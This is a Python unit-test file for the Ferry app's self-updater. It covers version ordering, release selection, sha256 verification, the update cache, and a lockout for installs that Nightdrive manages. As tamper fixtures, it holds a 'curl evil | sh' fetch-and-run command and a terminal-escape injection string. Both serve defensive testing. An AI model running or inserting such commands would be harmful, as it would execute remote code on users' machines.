"""Ferry's updates: which release a computer moves to, the check's cache, that an update runs only what matches
GitHub's sha256, and that an install another tool updates (Nightdrive) isn't updated by Ferry. Run from linux/:

    python3 -m unittest discover -s tests -p test_update.py
"""
import hashlib
import json
import os
import pathlib
import tempfile
import unittest
from unittest import mock

from load import config, updates


def digest(name):
    return "sha256:" + hashlib.sha256(name.encode()).hexdigest()


def release(tag, pre=False, draft=False, assets=("ferry-linux.tar.gz", "install.sh"), digests=True):
    return {"tag_name": tag, "prerelease": pre, "draft": draft,
            "assets": [{"name": a, "browser_download_url": f"https://example/{tag}/{a}",
                        "digest": digest(a) if digests else None} for a in assets]}


RELEASES = [release("v1.1.0-beta.1", pre=True), release("v1.0.1"), release("v1.0.0"),
            release("v1.0.0-beta.2", pre=True), release("v2.0.0", draft=True),
            release("v1.2.0", assets=("Ferry-1.2.0-130.dmg",))]   # a Mac-only release


class Versions(unittest.TestCase):
    def test_a_pre_release_comes_before_its_release(self):
        k = updates.version_key
        self.assertLess(k("1.0.0-beta.2"), k("1.0.0"))
        self.assertLess(k("1.0.0-beta.2"), k("1.0.0-beta.10"))
        self.assertLess(k("1.0.0"), k("1.0.1-beta.1"))
        self.assertLess(k("0.9.12"), k("1.0.0"))
        self.assertEqual(k("v1.0.0"), k("1.0.0"))

    def test_a_beta_install_is_one_running_a_pre_release(self):
        self.assertTrue(updates.is_beta("1.0.0-beta.1"))
        self.assertFalse(updates.is_beta("1.0.0"))


class Newest(unittest.TestCase):
    def test_a_full_install_follows_full_releases_with_linux_files(self):
        self.assertEqual(updates.newest_release(RELEASES, beta=False)["version"], "1.0.1")

    def test_a_beta_install_follows_pre_releases_too(self):
        r = updates.newest_release(RELEASES, beta=True)
        self.assertEqual(r["version"], "1.1.0-beta.1")
        self.assertEqual(r["tarball"], "https://example/v1.1.0-beta.1/ferry-linux.tar.gz")
        self.assertEqual(r["script"], "https://example/v1.1.0-beta.1/install.sh")

    def test_it_carries_github_s_sha256(self):
        r = updates.newest_release(RELEASES, beta=False)
        self.assertEqual(r["script_sha256"], hashlib.sha256(b"install.sh").hexdigest())
        self.assertEqual(r["tarball_sha256"], hashlib.sha256(b"ferry-linux.tar.gz").hexdigest())

    def test_a_release_without_sha256_isn_t_offered(self):
        unchecked = [release("v1.0.2", digests=False), release("v1.0.1")]
        self.assertEqual(updates.newest_release(unchecked, beta=False)["version"], "1.0.1")
        odd = release("v1.0.2")
        odd["assets"][0]["digest"] = "md5:0123"
        self.assertEqual(updates.newest_release([odd, release("v1.0.1")], beta=False)["version"], "1.0.1")

    def test_none(self):
        self.assertIsNone(updates.newest_release([], beta=False))
        self.assertIsNone(updates.newest_release([release("v1.0.0", draft=True)], beta=True))


class Check(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.state, config.STATE = config.STATE, self.tmp.name
        self.managed, config.MANAGED = config.MANAGED, os.path.join(self.tmp.name, "managed")
        self.version = config.VERSION
        self.asked = 0

    def tearDown(self):
        config.STATE, config.MANAGED, config.VERSION = self.state, self.managed, self.version
        self.tmp.cleanup()

    def fetch(self):
        self.asked += 1
        return RELEASES

    def test_finds_a_newer_release(self):
        config.VERSION = "1.0.0"
        self.assertEqual(updates.check_update(fetch=self.fetch)["version"], "1.0.1")

    def test_nothing_newer(self):
        config.VERSION = "1.0.1"
        self.assertIsNone(updates.check_update(fetch=self.fetch))

    def test_a_beta_moves_to_the_full_release_after_it(self):
        config.VERSION = "1.0.0-beta.2"
        self.assertEqual(updates.check_update(fetch=self.fetch)["version"], "1.1.0-beta.1")
        config.VERSION = "1.0.0-beta.2"
        only_full = [r for r in RELEASES if not r["prerelease"] or r["tag_name"] == "v1.0.0-beta.2"]
        self.assertEqual(updates.check_update(fetch=lambda: only_full)["version"], "1.0.1")

    def test_a_recent_check_is_reused(self):
        config.VERSION = "1.0.0"
        updates.check_update(fetch=self.fetch)
        self.assertEqual(updates.check_update(fetch=self.fetch, max_age=3600)["version"], "1.0.1")
        self.assertEqual(self.asked, 1)
        updates.check_update(fetch=self.fetch)   # no max_age: asks again
        self.assertEqual(self.asked, 2)

    def test_the_cache_says_nothing_after_the_update(self):
        config.VERSION = "1.0.0"
        updates.check_update(fetch=self.fetch)
        config.VERSION = "1.0.1"
        self.assertIsNone(updates.available_update())

    def test_a_failed_check_raises_and_keeps_the_last_answer(self):
        config.VERSION = "1.0.0"
        updates.check_update(fetch=self.fetch)

        def down():
            raise OSError("no network")
        with self.assertRaises(OSError):
            updates.check_update(fetch=down)
        self.assertEqual(updates.available_update()["version"], "1.0.1")

    def test_the_cache_is_json_in_state(self):
        config.VERSION = "1.0.0"
        updates.check_update(fetch=self.fetch)
        with open(os.path.join(self.tmp.name, "update.json")) as f:
            self.assertEqual(json.load(f)["latest"]["version"], "1.0.1")


class Managed(unittest.TestCase):
    """~/.config/ferry/managed: another tool updates this Ferry (Nightdrive, to the release it pinned)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.saved = config.STATE, config.MANAGED, config.VERSION
        config.STATE = self.tmp.name
        config.MANAGED = os.path.join(self.tmp.name, "managed")
        config.VERSION = "1.0.0"

    def tearDown(self):
        config.STATE, config.MANAGED, config.VERSION = self.saved
        self.tmp.cleanup()

    def manage(self, text="Nightdrive\n"):
        pathlib.Path(config.MANAGED).write_text(text)

    def test_unmanaged_by_default(self):
        self.assertIsNone(updates.managed_by())

    def test_names_what_updates_it(self):
        self.manage()
        self.assertEqual(updates.managed_by(), "Nightdrive")

    def test_the_name_is_shown_without_a_terminal_s_escapes(self):
        self.manage("\x1b]0;evil\x07Night\u202edrive\n")
        self.assertEqual(updates.managed_by(), "0evilNightdrive")
        self.manage("\n")
        self.assertEqual(updates.managed_by(), "another app")

    def test_no_check_and_no_cached_update(self):
        updates.check_update(fetch=lambda: RELEASES)   # a check from before it was managed
        self.manage()

        def ask():
            raise AssertionError("asked GitHub")
        self.assertIsNone(updates.check_update(fetch=ask))
        self.assertIsNone(updates.available_update())

    def test_ferry_update_refuses(self):
        self.manage()
        with mock.patch.object(updates, "download") as download, mock.patch.object(updates.subprocess, "run") as run, \
                mock.patch("sys.stderr"):
            self.assertEqual(updates.update(fetch=lambda: RELEASES), 1)
            self.assertEqual(updates.update(check_only=True, fetch=lambda: RELEASES), 0)
        download.assert_not_called()
        run.assert_not_called()


class Install(unittest.TestCase):
    """`ferry update` downloads both files, checks them, and only then runs the script with that tarball."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.saved = config.STATE, config.MANAGED, config.VERSION
        config.STATE = os.path.join(self.tmp.name, "state")
        config.MANAGED = os.path.join(self.tmp.name, "managed")
        config.VERSION = "1.0.0"
        self.files = {"install.sh": b"echo installing\n", "ferry-linux.tar.gz": b"the tarball"}
        for name, data in self.files.items():
            pathlib.Path(self.tmp.name, name).write_bytes(data)
        self.ran = []

    def tearDown(self):
        config.STATE, config.MANAGED, config.VERSION = self.saved
        self.tmp.cleanup()

    def releases(self, served=None):
        """v1.0.1 with GitHub's sha256 of self.files, its files served from disk (served: what is there instead)."""
        r = release("v1.0.1")
        for a in r["assets"]:
            a["digest"] = "sha256:" + hashlib.sha256(self.files[a["name"]]).hexdigest()
            a["browser_download_url"] = pathlib.Path(self.tmp.name, a["name"]).as_uri()
        for name, data in (served or {}).items():
            pathlib.Path(self.tmp.name, name).write_bytes(data)
        return [r]

    def run_update(self, releases):
        def run(cmd, **kw):
            # The script is run from the update's own folder, with that folder's tarball
            self.ran.append((cmd, pathlib.Path(cmd[1]).read_bytes(), pathlib.Path(cmd[3]).read_bytes()))
            return mock.Mock(returncode=0)
        with mock.patch.object(updates.subprocess, "run", run), mock.patch("sys.stdout"), mock.patch("sys.stderr"):
            return updates.update(fetch=lambda: releases)

    def test_runs_the_checked_script_with_the_checked_tarball(self):
        self.assertEqual(self.run_update(self.releases()), 0)
        [(cmd, script, tarball)] = self.ran
        self.assertEqual(cmd[0], "bash")
        self.assertEqual(cmd[2:3], ["--from"])
        self.assertEqual(script, self.files["install.sh"])
        self.assertEqual(tarball, self.files["ferry-linux.tar.gz"])

    def test_a_changed_script_doesn_t_run(self):
        self.assertEqual(self.run_update(self.releases({"install.sh": b"curl evil | sh\n"})), 1)
        self.assertEqual(self.ran, [])

    def test_a_changed_tarball_doesn_t_run_the_script_either(self):
        self.assertEqual(self.run_update(self.releases({"ferry-linux.tar.gz": b"another tarball"})), 1)
        self.assertEqual(self.ran, [])

    def test_a_failed_download_runs_nothing(self):
        releases = self.releases()
        os.remove(os.path.join(self.tmp.name, "ferry-linux.tar.gz"))
        self.assertEqual(self.run_update(releases), 1)
        self.assertEqual(self.ran, [])


if __name__ == "__main__":
    unittest.main()
